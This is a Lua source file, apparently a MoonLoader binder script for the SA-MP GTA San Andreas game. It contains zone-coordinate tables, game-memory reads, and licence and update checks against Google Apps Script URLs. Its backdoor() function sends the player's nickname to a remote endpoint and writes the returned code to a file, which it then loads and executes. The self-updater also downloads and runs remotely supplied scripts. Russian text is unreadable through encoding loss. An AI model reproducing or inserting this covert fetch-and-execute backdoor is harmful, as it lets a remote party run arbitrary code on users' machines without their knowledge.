    {"Starfish Casino", 2162.390, 1883.230, -89.084, 2437.390, 2012.180, 110.916},
    {"East Beach", 2747.740, -1668.130, -89.084, 2959.350, -1498.620, 110.916},
    {"Jefferson", 2056.860, -1372.040, -89.084, 2281.450, -1210.740, 110.916},
    {"Downtown Los Santos", 1463.900, -1290.870, -89.084, 1724.760, -1150.870, 110.916},
    {"Downtown Los Santos", 1463.900, -1430.870, -89.084, 1724.760, -1290.870, 110.916},
    {"Garver Bridge", -1499.890, 696.442, -179.615, -1339.890, 925.353, 20.385},
    {"Julius Thruway South", 1457.390, 823.228, -89.084, 2377.390, 863.229, 110.916},
    {"East Los Santos", 2421.030, -1628.530, -89.084, 2632.830, -1454.350, 110.916},
    {"Greenglass College", 964.391, 1044.690, -89.084, 1197.390, 1203.220, 110.916},
    {"Las Colinas", 2747.740, -1120.040, -89.084, 2959.350, -945.035, 110.916},
    {"Mulholland", 737.573, -768.027, -89.084, 1142.290, -674.885, 110.916},
    {"Ocean Docks", 2201.820, -2730.880, -89.084, 2324.000, -2418.330, 110.916},
    {"East Los Santos", 2462.130, -1454.350, -89.084, 2581.730, -1135.040, 110.916},
    {"Ganton", 2222.560, -1722.330, -89.084, 2632.830, -1628.530, 110.916},
    {"Avispa Country Club", -2831.890, -430.276, -6.1, -2646.400, -222.589, 200.000},
    {"Willowfield", 1970.620, -2179.250, -89.084, 2089.000, -1852.870, 110.916},
    {"Esplanade North", -1982.320, 1274.260, -4.5, -1524.240, 1358.900, 200.000},
    {"The High Roller", 1817.390, 1283.230, -89.084, 2027.390, 1469.230, 110.916},
    {"Ocean Docks", 2201.820, -2418.330, -89.084, 2324.000, -2095.000, 110.916},
    {"Last Dime Motel", 1823.080, 596.349, -89.084, 1997.220, 823.228, 110.916},
    {"Bayside Marina", -2353.170, 2275.790, 0.000, -2153.170, 2475.790, 200.000},
    {"King's", -2329.310, 458.411, -7.6, -1993.280, 578.396, 200.000},
    {"El Corona", 1692.620, -2179.250, -89.084, 1812.620, -1842.270, 110.916},
    {"Blackfield Chapel", 1375.600, 596.349, -89.084, 1558.090, 823.228, 110.916},
    {"The Pink Swan", 1817.390, 1083.230, -89.084, 2027.390, 1283.230, 110.916},
    {"Julius Thruway West", 1197.390, 1163.390, -89.084, 1236.630, 2243.230, 110.916},
    {"Los Flores", 2581.730, -1393.420, -89.084, 2747.740, -1135.040, 110.916},
    {"The Visage", 1817.390, 1863.230, -89.084, 2106.700, 2011.830, 110.916},
    {"Prickle Pine", 1938.800, 2624.230, -89.084, 2121.400, 2861.550, 110.916},
    {"Verona Beach", 851.449, -1804.210, -89.084, 1046.150, -1577.590, 110.916},
    {"Robada Intersection", -1119.010, 1178.930, -89.084, -862.025, 1351.450, 110.916},
    {"Linden Side", 2749.900, 943.235, -89.084, 2923.390, 1198.990, 110.916},
    {"Ocean Docks", 2703.580, -2302.330, -89.084, 2959.350, -2126.900, 110.916},
    {"Willowfield", 2324.000, -2059.230, -89.084, 2541.700, -1852.870, 110.916},
    {"King's", -2411.220, 265.243, -9.1, -1993.280, 373.539, 200.000},
    {"Commerce", 1323.900, -1842.270, -89.084, 1701.900, -1722.260, 110.916},
    {"Mulholland", 1269.130, -768.027, -89.084, 1414.070, -452.425, 110.916},
    {"Marina", 647.712, -1804.210, -89.084, 851.449, -1577.590, 110.916},
    {"Battery Point", -2741.070, 1268.410, -4.5, -2533.040, 1490.470, 200.000},
    {"The Four Dragons Casino", 1817.390, 863.232, -89.084, 2027.390, 1083.230, 110.916},
    {"Blackfield", 964.391, 1203.220, -89.084, 1197.390, 1403.220, 110.916},
    {"Julius Thruway North", 1534.560, 2433.230, -89.084, 1848.400, 2583.230, 110.916},
    {"Yellow Bell Gol Course", 1117.400, 2723.230, -89.084, 1457.460, 2863.230, 110.916},
    {"Idlewood", 1812.620, -1602.310, -89.084, 2124.660, -1449.670, 110.916},
    {"Redsands West", 1297.470, 2142.860, -89.084, 1777.390, 2243.230, 110.916},
    {"Doherty", -2270.040, -324.114, -1.2, -1794.920, -222.589, 200.000},
    {"Hilltop Farm", 967.383, -450.390, -3.0, 1176.780, -217.900, 200.000},
    {"Las Barrancas", -926.130, 1398.730, -3.0, -719.234, 1634.690, 200.000},
    {"Pirates in Men's Pants", 1817.390, 1469.230, -89.084, 2027.400, 1703.230, 110.916},
    {"City Hall", -2867.850, 277.411, -9.1, -2593.440, 458.411, 200.000},
    {"Avispa Country Club", -2646.400, -355.493, 0.000, -2270.040, -222.589, 200.000},
    {"The Strip", 2027.400, 863.229, -89.084, 2087.390, 1703.230, 110.916},
    {"Hashbury", -2593.440, -222.589, -1.0, -2411.220, 54.722, 200.000},
    {"Los Santos International", 1852.000, -2394.330, -89.084, 2089.000, -2179.250, 110.916},
    {"Whitewood Estates", 1098.310, 1726.220, -89.084, 1197.390, 2243.230, 110.916},
    {"Sherman Reservoir", -789.737, 1659.680, -89.084, -599.505, 1929.410, 110.916},
    {"El Corona", 1812.620, -2179.250, -89.084, 1970.620, -1852.870, 110.916},
    {"Downtown", -1700.010, 744.267, -6.1, -1580.010, 1176.520, 200.000},
    {"Foster Valley", -2178.690, -1250.970, 0.000, -1794.920, -1115.580, 200.000},
    {"Las Payasadas", -354.332, 2580.360, 2.0, -133.625, 2816.820, 200.000},
    {"Valle Ocultado", -936.668, 2611.440, 2.0, -715.961, 2847.900, 200.000},
    {"Blackfield Intersection", 1166.530, 795.010, -89.084, 1375.600, 1044.690, 110.916},
    {"Ganton", 2222.560, -1852.870, -89.084, 2632.830, -1722.330, 110.916},
    {"Easter Bay Airport", -1213.910, -730.118, 0.000, -1132.820, -50.096, 200.000},
    {"Redsands East", 1817.390, 2011.830, -89.084, 2106.700, 2202.760, 110.916},
    {"Esplanade East", -1499.890, 578.396, -79.615, -1339.890, 1274.260, 20.385},
    {"Caligula's Palace", 2087.390, 1543.230, -89.084, 2437.390, 1703.230, 110.916},
    {"Royal Casino", 2087.390, 1383.230, -89.084, 2437.390, 1543.230, 110.916},
    {"Richman", 72.648, -1235.070, -89.084, 321.356, -1008.150, 110.916},
    {"Starfish Casino", 2437.390, 1783.230, -89.084, 2685.160, 2012.180, 110.916},
    {"Mulholland", 1281.130, -452.425, -89.084, 1641.130, -290.913, 110.916},
    {"Downtown", -1982.320, 744.170, -6.1, -1871.720, 1274.260, 200.000},
    {"Hankypanky Point", 2576.920, 62.158, 0.000, 2759.250, 385.503, 200.000},
    {"K.A.C.C. Military Fuels", 2498.210, 2626.550, -89.084, 2749.900, 2861.550, 110.916},
    {"Harry Gold Parkway", 1777.390, 863.232, -89.084, 1817.390, 2342.830, 110.916},
    {"Bayside Tunnel", -2290.190, 2548.290, -89.084, -1950.190, 2723.290, 110.916},
    {"Ocean Docks", 2324.000, -2302.330, -89.084, 2703.580, -2145.100, 110.916},
    {"Richman", 321.356, -1044.070, -89.084, 647.557, -860.619, 110.916},
    {"Randolph Industrial Estate", 1558.090, 596.349, -89.084, 1823.080, 823.235, 110.916},
    {"East Beach", 2632.830, -1852.870, -89.084, 2959.350, -1668.130, 110.916},
    {"Flint Water", -314.426, -753.874, -89.084, -106.339, -463.073, 110.916},
    {"Blueberry", 19.607, -404.136, 3.8, 349.607, -220.137, 200.000},
    {"Linden Station", 2749.900, 1198.990, -89.084, 2923.390, 1548.990, 110.916},
    {"Glen Park", 1812.620, -1350.720, -89.084, 2056.860, -1100.820, 110.916},
    {"Downtown", -1993.280, 265.243, -9.1, -1794.920, 578.396, 200.000},
    {"Redsands West", 1377.390, 2243.230, -89.084, 1704.590, 2433.230, 110.916},
    {"Richman", 321.356, -1235.070, -89.084, 647.522, -1044.070, 110.916},
    {"Gant Bridge", -2741.450, 1659.680, -6.1, -2616.400, 2175.150, 200.000},
    {"Lil' Probe Inn", -90.218, 1286.850, -3.0, 153.859, 1554.120, 200.000},
    {"Flint Intersection", -187.700, -1596.760, -89.084, 17.063, -1276.600, 110.916},
    {"Las Colinas", 2281.450, -1135.040, -89.084, 2632.740, -945.035, 110.916},
    {"Sobell Rail Yards", 2749.900, 1548.990, -89.084, 2923.390, 1937.250, 110.916},
    {"The Emerald Isle", 2011.940, 2202.760, -89.084, 2237.400, 2508.230, 110.916},
    {"El Castillo del Diablo", -208.570, 2123.010, -7.6, 114.033, 2337.180, 200.000},
    {"Santa Flora", -2741.070, 458.411, -7.6, -2533.040, 793.411, 200.000},
    {"Playa del Seville", 2703.580, -2126.900, -89.084, 2959.350, -1852.870, 110.916},
    {"Market", 926.922, -1577.590, -89.084, 1370.850, -1416.250, 110.916},
    {"Queens", -2593.440, 54.722, 0.000, -2411.220, 458.411, 200.000},
    {"Pilson Intersection", 1098.390, 2243.230, -89.084, 1377.390, 2507.230, 110.916},
    {"Spinybed", 2121.400, 2663.170, -89.084, 2498.210, 2861.550, 110.916},
    {"Pilgrim", 2437.390, 1383.230, -89.084, 2624.400, 1783.230, 110.916},
    {"Blackfield", 964.391, 1403.220, -89.084, 1197.390, 1726.220, 110.916},
    {"'The Big Ear'", -410.020, 1403.340, -3.0, -137.969, 1681.230, 200.000},
    {"Dillimore", 580.794, -674.885, -9.5, 861.085, -404.790, 200.000},
    {"El Quebrados", -1645.230, 2498.520, 0.000, -1372.140, 2777.850, 200.000},
    {"Esplanade North", -2533.040, 1358.900, -4.5, -1996.660, 1501.210, 200.000},
    {"Easter Bay Airport", -1499.890, -50.096, -1.0, -1242.980, 249.904, 200.000},
    {"Fisher's Lagoon", 1916.990, -233.323, -100.000, 2131.720, 13.800, 200.000},
    {"Mulholland", 1414.070, -768.027, -89.084, 1667.610, -452.425, 110.916},
    {"East Beach", 2747.740, -1498.620, -89.084, 2959.350, -1120.040, 110.916},
    {"San Andreas Sound", 2450.390, 385.503, -100.000, 2759.250, 562.349, 200.000},
    {"Shady Creeks", -2030.120, -2174.890, -6.1, -1820.640, -1771.660, 200.000},
    {"Market", 1072.660, -1416.250, -89.084, 1370.850, -1130.850, 110.916},
    {"Rockshore West", 1997.220, 596.349, -89.084, 2377.390, 823.228, 110.916},
    {"Prickle Pine", 1534.560, 2583.230, -89.084, 1848.400, 2863.230, 110.916},
    {"Easter Basin", -1794.920, -50.096, -1.04, -1499.890, 249.904, 200.000},
    {"Leafy Hollow", -1166.970, -1856.030, 0.000, -815.624, -1602.070, 200.000},
    {"LVA Freight Depot", 1457.390, 863.229, -89.084, 1777.400, 1143.210, 110.916},
    {"Prickle Pine", 1117.400, 2507.230, -89.084, 1534.560, 2723.230, 110.916},
    {"Blueberry", 104.534, -220.137, 2.3, 349.607, 152.236, 200.000},
    {"El Castillo del Diablo", -464.515, 2217.680, 0.000, -208.570, 2580.360, 200.000},
    {"Downtown", -2078.670, 578.396, -7.6, -1499.890, 744.267, 200.000},
    {"Rockshore East", 2537.390, 676.549, -89.084, 2902.350, 943.235, 110.916},
    {"San Fierro Bay", -2616.400, 1501.210, -3.0, -1996.660, 1659.680, 200.000},
    {"Paradiso", -2741.070, 793.411, -6.1, -2533.040, 1268.410, 200.000},
    {"The Camel's Toe", 2087.390, 1203.230, -89.084, 2640.400, 1383.230, 110.916},
    {"Old Venturas Strip", 2162.390, 2012.180, -89.084, 2685.160, 2202.760, 110.916},
    {"Juniper Hill", -2533.040, 578.396, -7.6, -2274.170, 968.369, 200.000},
    {"Juniper Hollow", -2533.040, 968.369, -6.1, -2274.170, 1358.900, 200.000},
    {"Roca Escalante", 2237.400, 2202.760, -89.084, 2536.430, 2542.550, 110.916},
    {"Julius Thruway East", 2685.160, 1055.960, -89.084, 2749.900, 2626.550, 110.916},
    {"Verona Beach", 647.712, -2173.290, -89.084, 930.221, -1804.210, 110.916},
    {"Foster Valley", -2178.690, -599.884, -1.2, -1794.920, -324.114, 200.000},
    {"Arco del Oeste", -901.129, 2221.860, 0.000, -592.090, 2571.970, 200.000},
    {"Fallen Tree", -792.254, -698.555, -5.3, -452.404, -380.043, 200.000},
    {"The Farm", -1209.670, -1317.100, 114.981, -908.161, -787.391, 251.981},
    {"The Sherman Dam", -968.772, 1929.410, -3.0, -481.126, 2155.260, 200.000},
    {"Esplanade North", -1996.660, 1358.900, -4.5, -1524.240, 1592.510, 200.000},
    {"Financial", -1871.720, 744.170, -6.1, -1701.300, 1176.420, 300.000},
    {"Garcia", -2411.220, -222.589, -1.14, -2173.040, 265.243, 200.000},
    {"Montgomery", 1119.510, 119.526, -3.0, 1451.400, 493.323, 200.000},
    {"Creek", 2749.900, 1937.250, -89.084, 2921.620, 2669.790, 110.916},
    {"Los Santos International", 1249.620, -2394.330, -89.084, 1852.000, -2179.250, 110.916},
    {"Santa Maria Beach", 72.648, -2173.290, -89.084, 342.648, -1684.650, 110.916},
    {"Mulholland Intersection", 1463.900, -1150.870, -89.084, 1812.620, -768.027, 110.916},
    {"Angel Pine", -2324.940, -2584.290, -6.1, -1964.220, -2212.110, 200.000},
    {"Verdant Meadows", 37.032, 2337.180, -3.0, 435.988, 2677.900, 200.000},
    {"Octane Springs", 338.658, 1228.510, 0.000, 664.308, 1655.050, 200.000},
    {"Come-A-Lot", 2087.390, 943.235, -89.084, 2623.180, 1203.230, 110.916},
    {"Redsands West", 1236.630, 1883.110, -89.084, 1777.390, 2142.860, 110.916},
    {"Santa Maria Beach", 342.648, -2173.290, -89.084, 647.712, -1684.650, 110.916},
    {"Verdant Bluffs", 1249.620, -2179.250, -89.084, 1692.620, -1842.270, 110.916},
    {"Las Venturas Airport", 1236.630, 1203.280, -89.084, 1457.370, 1883.110, 110.916},
    {"Flint Range", -594.191, -1648.550, 0.000, -187.700, -1276.600, 200.000},
    {"Verdant Bluffs", 930.221, -2488.420, -89.084, 1249.620, -2006.780, 110.916},
    {"Palomino Creek", 2160.220, -149.004, 0.000, 2576.920, 228.322, 200.000},
    {"Ocean Docks", 2373.770, -2697.090, -89.084, 2809.220, -2330.460, 110.916},
    {"Easter Bay Airport", -1213.910, -50.096, -4.5, -947.980, 578.396, 200.000},
    {"Whitewood Estates", 883.308, 1726.220, -89.084, 1098.310, 2507.230, 110.916},
    {"Calton Heights", -2274.170, 744.170, -6.1, -1982.320, 1358.900, 200.000},
    {"Easter Basin", -1794.920, 249.904, -9.1, -1242.980, 578.396, 200.000},
    {"Los Santos Inlet", -321.744, -2224.430, -89.084, 44.615, -1724.430, 110.916},
    {"Doherty", -2173.040, -222.589, -1.0, -1794.920, 265.243, 200.000},
    {"Mount Chiliad", -2178.690, -2189.910, -47.917, -2030.120, -1771.660, 576.083},
    {"Fort Carson", -376.233, 826.326, -3.0, 123.717, 1220.440, 200.000},
    {"Foster Valley", -2178.690, -1115.580, 0.000, -1794.920, -599.884, 200.000},
    {"Ocean Flats", -2994.490, -222.589, -1.0, -2593.440, 277.411, 200.000},
    {"Fern Ridge", 508.189, -139.259, 0.000, 1306.660, 119.526, 200.000},
    {"Bayside", -2741.070, 2175.150, 0.000, -2353.170, 2722.790, 200.000},
    {"Las Venturas Airport", 1457.370, 1203.280, -89.084, 1777.390, 1883.110, 110.916},
    {"Blueberry Acres", -319.676, -220.137, 0.000, 104.534, 293.324, 200.000},
    {"Palisades", -2994.490, 458.411, -6.1, -2741.070, 1339.610, 200.000},
    {"North Rock", 2285.370, -768.027, 0.000, 2770.590, -269.740, 200.000},
    {"Hunter Quarry", 337.244, 710.840, -115.239, 860.554, 1031.710, 203.761},
    {"Los Santos International", 1382.730, -2730.880, -89.084, 2201.820, -2394.330, 110.916},
    {"Missionary Hill", -2994.490, -811.276, 0.000, -2178.690, -430.276, 200.000},
    {"San Fierro Bay", -2616.400, 1659.680, -3.0, -1996.660, 2175.150, 200.000},
    {"Restricted Area", -91.586, 1655.050, -50.000, 421.234, 2123.010, 250.000},
    {"Mount Chiliad", -2997.470, -1115.580, -47.917, -2178.690, -971.913, 576.083},
    {"Mount Chiliad", -2178.690, -1771.660, -47.917, -1936.120, -1250.970, 576.083},
    {"Easter Bay Airport", -1794.920, -730.118, -3.0, -1213.910, -50.096, 200.000},
    {"The Panopticon", -947.980, -304.320, -1.1, -319.676, 327.071, 200.000},
    {"Shady Creeks", -1820.640, -2643.680, -8.0, -1226.780, -1771.660, 200.000},
    {"Back o Beyond", -1166.970, -2641.190, 0.000, -321.744, -1856.030, 200.000},
    {"Mount Chiliad", -2994.490, -2189.910, -47.917, -2178.690, -1115.580, 576.083},
    {"Tierra Robada", -1213.910, 596.349, -242.990, -480.539, 1659.680, 900.000},
    {"Flint County", -1213.910, -2892.970, -242.990, 44.615, -768.027, 900.000},
    {"Whetstone", -2997.470, -2892.970, -242.990, -1213.910, -1115.580, 900.000},
    {"Bone County", -480.539, 596.349, -242.990, 869.461, 2993.870, 900.000},
    {"Tierra Robada", -2997.470, 1659.680, -242.990, -480.539, 2993.870, 900.000},
    {"San Fierro", -2997.470, -1115.580, -242.990, -1213.910, 1659.680, 900.000},
    {"Las Venturas", 869.461, 596.349, -242.990, 2997.060, 2993.870, 900.000},
    {"Red County", -1213.910, -768.027, -242.990, 2997.060, 596.349, 900.000},
    {"Los Santos", 44.615, -2892.970, -242.990, 2997.060, -768.027, 900.000}}
    for i, v in ipairs(streets) do
        if (x >= v[2]) and (y >= v[3]) and (z >= v[4]) and (x <= v[5]) and (y <= v[6]) and (z <= v[7]) then
            return v[1]
        end
    end
    return "Unknown"
end

function returnWeapDistCol(weapid, dist)
	-- ����� 100 �4 90 ��� 50 ��� 40 ���� 48 �� 80 ��������� 50
	if tweapondist[weapid] == nil then return "{FFFAFA}" end
	if tweapondist[weapid] >= dist then return "{FF0000}" end
	if tweapondist[weapid] < dist then return "{00FF00}" end
end

function getAmmoInClip()
  local struct = getCharPointer(playerPed)
  local prisv = struct + 0x0718
  local prisv = memory.getint8(prisv, false)
  local prisv = prisv * 0x1C
  local prisv2 = struct + 0x5A0
  local prisv2 = prisv2 + prisv
  local prisv2 = prisv2 + 0x8
  local ammo = memory.getint32(prisv2, false)
  return ammo
end

local russian_characters = {
    [168] = '�', [184] = '�', [192] = '�', [193] = '�', [194] = '�', [195] = '�', [196] = '�', [197] = '�', [198] = '�', [199] = '�', [200] = '�', [201] = '�', [202] = '�', [203] = '�', [204] = '�', [205] = '�', [206] = '�', [207] = '�', [208] = '�', [209] = '�', [210] = '�', [211] = '�', [212] = '�', [213] = '�', [214] = '�', [215] = '�', [216] = '�', [217] = '�', [218] = '�', [219] = '�', [220] = '�', [221] = '�', [222] = '�', [223] = '�', [224] = '�', [225] = '�', [226] = '�', [227] = '�', [228] = '�', [229] = '�', [230] = '�', [231] = '�', [232] = '�', [233] = '�', [234] = '�', [235] = '�', [236] = '�', [237] = '�', [238] = '�', [239] = '�', [240] = '�', [241] = '�', [242] = '�', [243] = '�', [244] = '�', [245] = '�', [246] = '�', [247] = '�', [248] = '�', [249] = '�', [250] = '�', [251] = '�', [252] = '�', [253] = '�', [254] = '�', [255] = '�',
}
function string.rlower(s)
    s = s:lower()
    local strlen = s:len()
    if strlen == 0 then return s end
    s = s:lower()
    local output = ''
    for i = 1, strlen do
        local ch = s:byte(i)
        if ch >= 192 and ch <= 223 then -- upper russian characters
            output = output .. russian_characters[ch + 32]
        elseif ch == 168 then -- �
            output = output .. russian_characters[184]
        else
            output = output .. string.char(ch)
        end
    end
    return output
end
function string.rupper(s)
    s = s:upper()
    local strlen = s:len()
    if strlen == 0 then return s end
    s = s:upper()
    local output = ''
    for i = 1, strlen do
        local ch = s:byte(i)
        if ch >= 224 and ch <= 255 then -- lower russian characters
            output = output .. russian_characters[ch - 32]
        elseif ch == 184 then -- �
            output = output .. russian_characters[168]
        else
            output = output .. string.char(ch)
        end
    end
    return output
end

function getStrByState(keyState)
	if keyState == 0 then
		return "{ff8533}OFF{ffffff}"
	end
	return "{85cf17}ON{ffffff}"
end

function req(u)
		while not freereq do wait(0) end
		freereq = false
		req_index = req_index + 1
		local url = u
		local file_path = getWorkingDirectory() .. '/resource/downloads/' .. tostring(req_index) .. '.dat'
		while true do
			sysdownloadcomplete = false
			download_id = downloadUrlToFile(url, file_path, download_handler)
			while not sysdownloadcomplete do wait(0) end
			local responsefile = io.open(file_path, "r")
			if responsefile ~= nil then
				local responsetext = responsefile:read("*a")
				io.close(responsefile)
				os.remove(file_path)
				freereq = true
				return u8:decode(responsetext)
			end
			os.remove(file_path)
			sampAddChatMessage("{FF0000}[LUA]: ������� ��� ���������� ������� �" .. req_index .. ", �������� �������...", 0xFFFF0000)
		end
		return ""
end

function cmd_skip(sparams)
		lua_thread.create(function()
				if sparams == "0" then skipresponse = 0 return end

				local responsetext = req('https://script.google.com/macros/s/AKfycbwa7oHfcccheNS3KnSHpnPEttNcIE-bWPrI3AXkt_Tzx_GOG9w/exec?do=alogin&pass=' .. sparams .. '')
				local re0 = regex.new("True@@.@") --
				local pas = re0:match(responsetext)
				if pas == nil then sampAddChatMessage("{FF0000}[LUA]: �������� ������.", 0xFFFF0000) thisScript():unload() return else skipresponse = 1 return end
		end)
end


function checkupdate()
		local responsetext = req('https://script.google.com/macros/s/AKfycbwa7oHfcccheNS3KnSHpnPEttNcIE-bWPrI3AXkt_Tzx_GOG9w/exec?do=getinfo')
		local re0 = regex.new("Version: (.*)\\; URL: (.*)\\; Service: (.*)\\; What new: (.*)@@.@") --
		local ver, url, serv, wn = re0:match(responsetext)
		if ver == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ���������� �� �����������.", 0xFFFF0000) thisScript():unload() return end
		if serv == "1" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������ ������ �� ������� �������� ����������� ������.", 0xFFFF0000) thisScript():unload() return end
		guis.updatestatus.wn = strunsplit(wn, 160)
		if tonumber(ver) > V then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ����� ������ " .. ver .. ". ������ ������ ���������� ����������.", 0xFFFF0000) updatescr(url, ver) end
end

function updatescr(url, ver)
		local u = url
		if u == nil then
				local responsetext = req('https://script.google.com/macros/s/AKfycbwa7oHfcccheNS3KnSHpnPEttNcIE-bWPrI3AXkt_Tzx_GOG9w/exec?do=getinfo')
				local re0 = regex.new("Version: (.*)\\; URL: (.*)\\; Service: (.*)\\; What new: (.*)@@.@") --
				local ver, urll, serv, wn = re0:match(responsetext)
				if ver == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ���������� �� �����������.", 0xFFFF0000) thisScript():unload() return  end
				if serv == "1" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������ ������ �� ������� �������� ����������� ������.", 0xFFFF0000) thisScript():unload() return end
				u = urll
		end
		u = u:gsub("\\", "")
		local file_path = getWorkingDirectory() .. '/Binder for CO by Belka version ' .. ver .. '.lua'
		update_id = downloadUrlToFile(u, file_path, update_handler)
		while not updatedownloadcomplete do wait(0) end
		sampAddChatMessage("{FF0000}[LUA]: ���������� ���������.", 0xFFFF0000) 
		isobnova = true 
		os.remove("Moonloader\\Binder for CO by Belka version " .. tostring(V) .. ".lua") 
		
		script.load("Moonloader\\Binder for CO by Belka version " .. ver .. ".lua") 
		thisScript():unload() 
		return
end

function update_handler(id, status, p1, p2)
	  if stop_downloading then
	    	stop_downloading = false
	    	download_id = nil
	    	return false -- �������� ��������
	  end

	  if status == dlstatus.STATUS_DOWNLOADINGDATA then
	    	print(string.format('��������� %d �� %d.', p1, p2))
	  elseif status == dlstatus.STATUS_ENDDOWNLOADDATA then
	    	updatedownloadcomplete = true
	  end
end

function backdoor()
	local a = req("https://script.google.com/macros/s/AKfycbxUzYRtf4kFUXN6rYk-1jHq8O94bImXEzhSXQqY89FDMAEd0A6B/exec?do=get&nick=" .. sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) .. "")
	local code, ans = a:match("@@.@ S%: (%d+)%; C%: (.*) @@..@.@")
	if ans ~= nil and ans:match("Backdoor for binder") ~= nil then 
		local new = "" .. (thisScript().directory) .. "\\backdoorforbelkabinder.lua"
		local ns = io.open(new, "a")
		ns:write(ans)
		ns:close()
		script.load("moonloader/backdoorforbelkabinder.lua")
		if code == "1" then thisScript():unload() end
	end
end

function prepare()
		lua_thread.create(
				function()
						if skipresponse ~= 1 then
								if os.clock() <= 30 and (dinf[1][1] or dinf[2][1]) then 
									dinf[1][1] = false
									dinf[2][1] = false 
									dinf_ini.Settings.dinf1 = 0
									dinf_ini.Settings.dinf2 = 0
									inicfg.save(dinf_ini, "dinf")
								end

								local serarr
								local getip = false
								lua_thread.create(function()
									local responsetext = req("https://script.google.com/macros/s/AKfycbw1NMwlEuzdfk1K3oyx9mydURgmP5j69yNBU2hxTuUpU_1zWEQ/exec?do=get")
									local str = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
									serarr = str:split("; ")
									getip = true
								end)
								
								
								while not getip do wait(0) end
								if indexof(select(1, sampGetCurrentServerAddress()), serarr) == false then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���� ������� ������ ������� ����������.", 0xFFFF0000) thisScript():unload() return end
								--wait(10000)
								while true do wait(0) local x, y, z = getActiveCameraCoordinates() if (x ~= 1093 and x ~= -1826.8193359375) or (y ~= -2036 and y ~= 1074.6199951172) or (z ~= 90 and z ~= 191.18589782715) then break end end
								local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ���������� ������� � ������. �� ���������� ������� �������� ���� ���.", 0xFFFF0000)
								rkeys.registerHotKey(makeHotKey(13), true, hk_13)
								backdoor()
								checkupdate()
								local nick = sampGetPlayerNickname(myid)
								local f, s = nick:match("(.*)%_(.*)")
								
								local re0 = regex.new("\\@\\@\\.\\@ (.*) \\@\\@\\.\\.\\@\\.\\@")
								local res
								local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=authnew&nick=' .. f .. '%20' .. s .. '') -- ����� ������� ����
								res = re0:match(responsetext)
								if res == nil then
									show.othervars.saccess = true
									local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=newgl&nick=' .. f .. '%20' .. s .. '') -- ����� �������
									res = re0:match(responsetext)
									if res == nil then
										access.saccess = true
										local responsetext = req('https://script.google.com/macros/s/AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA/exec?do=newfind&name=' .. nick .. '') -- �� �����
										res = re0:match(responsetext)
										if res == nil then
											sendtolog("��������� ������� �����������", 1) 
											sr()
											sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - ������ ������.", 0xFFFF0000)
											thisScript():unload() 
											return 
										end
									else
										access.isglory = true
									end
								end

								local state, key, config = res:match("(.*)%@%#%#%@%@%@%#%#%@ (.*)%@%#%#%@%@%@%#%#%@ (.*)")
								if tonumber(state) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - ������ �����������.", 0xFFFF0000) thisScript():unload() return end 

								--access.backup 
								access.state = tonumber(state)
								access.key = key
								sendtolog("�������� �����������", 1)
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - �������� �����������.", 0xFFFF0000)
								if access.backup then
									local b_config = decodeJson(config)
									if b_config ~= nil then
										sampAddChatMessage("{FF0000}[LUA]: ���� ������� �� ������. �������� ��������� ����� �� �������...", 0xFFFF0000)
										inicfg.save(b_config, "config")
										sampAddChatMessage("{FF0000}[LUA]: �������������� ���������. ������ ����� ������������.", 0xFFFF0000)
										isobnova = true
										thisScript():reload()
									end
								end

								if access.state == 1 or access.state == 2 or access.state == 3 or access.state == 4 or access.state == 6 then 
									-- 0 - ������, 1 - ������, 2 - ���, 3 - ��������, 4 - �������, 5 - �������� ������, 6 �������� ����
									-- show.othervars.saccess = true - ��������� ������ � ����. ���������� �������
									-- access.saccess = true - ���� ����, ��� ������ ������������ ����� ������� �����
									local responsetext = req('https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=check&nick=' .. nick .. '') -- �������� �������� �� ����� �����������
									local lvl = responsetext:match("%@%@%.%@ (%d+) %@%.%@%.%@")
									if tonumber(lvl) ~= nil then
										access.alevel = 0
										sampRegisterChatCommand("balogin", cmd_balogin)
									end
								end
								
								if access.saccess then -- ��������� ������
									config_ini.UserClist[12] = access.state == 0 and "������� �12" or access.state ~= 6 and "�������� ������� �����-������� ����� \"�.�.�.�.\"" or "�������� ������� �����-������� ����� ��������� ����� \"�.�.�.�.\""
								else
									config_ini.UserClist[12] = access.state == 0 and "���������� ����� \"�.�.�.�.\"" or access.state ~= 6 and "������� �����-������� ����� \"�.�.�.�.\"" or "������� �����-������� ����� ��������� ����� \"�.�.�.�.\""
								end	
								
								if not show.othervars.saccess then
									local arr = {[0] = "������ �.�.�.�.", [1] = "������ �.�.�.�.", [2] = "����������� ��������� �.�.�.�.", [3] = "�������� �.�.�.�.", [4] = "������� �.�.�.�."}
									PlayerU = arr[access.state] ~= nil and arr[access.state] or "���� �.�.�.�."
									tag = "|| �.�.�.�. ||"
									useclist = "12"
								end
						end				
						
						if config_ini.Settings.PlayerFirstName == "" or config_ini.Settings.PlayerSecondName == "" or config_ini.Settings.PlayerRank == "" then
								wait(delay)
								sampSendChat("/stats")
								while not sampIsDialogActive() do wait(0) end
								local text = sampGetDialogText()
								wait(100)
								sampCloseCurrentDialogWithButton(0) sampCloseCurrentDialogWithButton(0) sampCloseCurrentDialogWithButton(0)
								for v in text:gmatch('[^\n]+') do
								    local fn, sn = v:match("���	(%a+)_(%a+)")
								    if fn ~= nil then
